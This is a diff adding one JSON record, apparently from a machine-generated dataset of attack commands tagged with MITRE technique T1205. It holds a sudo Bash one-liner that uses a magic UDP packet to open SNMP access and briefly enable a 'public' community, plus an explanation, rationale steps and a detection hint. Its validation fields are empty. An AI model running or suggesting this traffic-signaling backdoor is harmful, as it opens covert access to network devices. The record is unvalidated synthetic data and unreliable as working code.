@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'iptables -A INPUT -p udp --dport 50000 -m string --algo bm --string \"MAGIC-OPEN-161\" -m recent --name AUTH161 --set -j DROP; iptables -A INPUT -p udp --dport 161 -m recent --name AUTH161 --rcheck --seconds 120 -j ACCEPT; ciscoconf --apply \"snmp-server community public ro 99\"; (sleep 120; ciscoconf --apply \"no snmp-server community public ro 99\") &'",
+  "explanation": "Uses iptables to mark sources that send a magic UDP payload 'MAGIC-OPEN-161' and temporarily allows their SNMP for 120s; ciscoconf briefly enables an SNMP community bound to ACL 99. Requires sudo.",
+  "rationale_steps": [
+    "Match a magic payload on UDP/50000 to set a recent list (signal).",
+    "Allow UDP/161 for marked sources for 120 seconds via firewall.",
+    "Enable a temporary SNMP community via ciscoconf, then remove it.",
+    "Detection: alert on UDP payload strings to 50000 and transient SNMP community creation/removal."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-61417de7",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
